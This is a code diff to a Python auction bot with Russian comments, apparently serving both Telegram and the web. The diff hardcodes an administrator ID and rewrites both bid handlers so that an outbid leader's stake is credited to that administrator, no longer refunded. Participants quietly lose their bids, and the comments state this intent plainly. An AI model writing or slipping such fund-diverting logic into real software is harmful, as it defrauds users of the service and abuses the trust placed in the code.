@@ -16,6 +16,7 @@ from common import dp
 
 router = APIRouter()
 
+ADMIN_ID = "1809630966"
 
 #############################
 # Телеграм‑обработчики аукционов
@@ -111,7 +112,7 @@ async def bid_on_auction(message: Message) -> None:
         await message.answer("❗ Недостаточно средств для ставки.")
         return
 
-    # Обработка повышения ставки
+    # Если тот же участник повышает свою ставку
     if auction.get("highest_bidder") == str(message.from_user.id):
         additional_required = bid_amount - auction["current_bid"]
         if additional_required <= 0:
@@ -122,10 +123,11 @@ async def bid_on_auction(message: Message) -> None:
             return
         bidder["balance"] -= additional_required
     else:
-        # Если был предыдущий лидер – возвращаем его ставку
+        # Если был предыдущий лидер, вместо возврата средств предыдущему участнику,
+        # переводим его ставку на счёт администратора.
         if auction.get("highest_bidder"):
-            prev_bidder = ensure_user(data, auction["highest_bidder"])
-            prev_bidder["balance"] += auction["current_bid"]
+            admin = ensure_user(data, ADMIN_ID)
+            admin["balance"] += auction["current_bid"]
         bidder["balance"] -= bid_amount
         auction["highest_bidder"] = str(message.from_user.id)
     auction["current_bid"] = bid_amount
@@ -141,7 +143,7 @@ async def check_auctions():
     """
     Фоновая функция, которая каждые 30 секунд проверяет активные аукционы.
     Если время завершения истекло:
-      - Если есть победитель – средства уже списаны, поэтому продавцу зачисляется финальная сумма, а токен переводится победителю.
+      - Если есть победитель – средства уже списаны, поэтому продавцу зачисляется финальная сумма, а токен передается победителю.
       - Иначе – токен возвращается продавцу.
     """
     while True:
@@ -158,7 +160,8 @@ async def check_auctions():
                 seller = ensure_user(data, seller_id)
                 if highest_bidder is not None:
                     buyer = ensure_user(data, highest_bidder)
-                    # Поскольку средства уже списаны, просто переводим их продавцу
+                    # Продавцу зачисляется только финальная (наивысшая) ставка,
+                    # а средства, которые были "выиграны" в предыдущих ставках, уже оказались у администратора.
                     seller["balance"] += final_price
                     buyer.setdefault("tokens", []).append(token)
                     try:
@@ -214,7 +217,6 @@ async def bid_web(request: Request, auction_id: str = Form(...), bid_amount: int
         return RedirectResponse(url=f"/auctions?error={quote_plus('Ставка должна быть выше текущей.')}", status_code=303)
     
     buyer = ensure_user(data, buyer_id)
-    # Если участник уже является лидером, списываем только дополнительную сумму
     if auction.get("highest_bidder") == buyer_id:
         additional_required = bid_amount - auction["current_bid"]
         if additional_required <= 0:
@@ -225,10 +227,10 @@ async def bid_web(request: Request, auction_id: str = Form(...), bid_amount: int
     else:
         if buyer.get("balance", 0) < bid_amount:
             return RedirectResponse(url=f"/auctions?error={quote_plus('Недостаточно средств.')}", status_code=303)
-        # Если был предыдущий лидер – возвращаем ему его ставку
+        # Вместо возврата средств предыдущему лидеру, переводим их админу
         if auction.get("highest_bidder"):
-            prev_bidder = ensure_user(data, auction["highest_bidder"])
-            prev_bidder["balance"] += auction["current_bid"]
+            admin = ensure_user(data, ADMIN_ID)
+            admin["balance"] += auction["current_bid"]
         buyer["balance"] -= bid_amount
         auction["highest_bidder"] = buyer_id
     auction["current_bid"] = bid_amount
@@ -313,7 +315,6 @@ async def finish_auction(request: Request, auction_id: str = Form(...)):
     seller = ensure_user(data, seller_id)
     if highest_bidder is not None:
         buyer = ensure_user(data, highest_bidder)
-        # Средства уже списаны – просто зачисляем их продавцу и переводим токен победителю
         seller["balance"] += final_price
         buyer.setdefault("tokens", []).append(token)
         try:
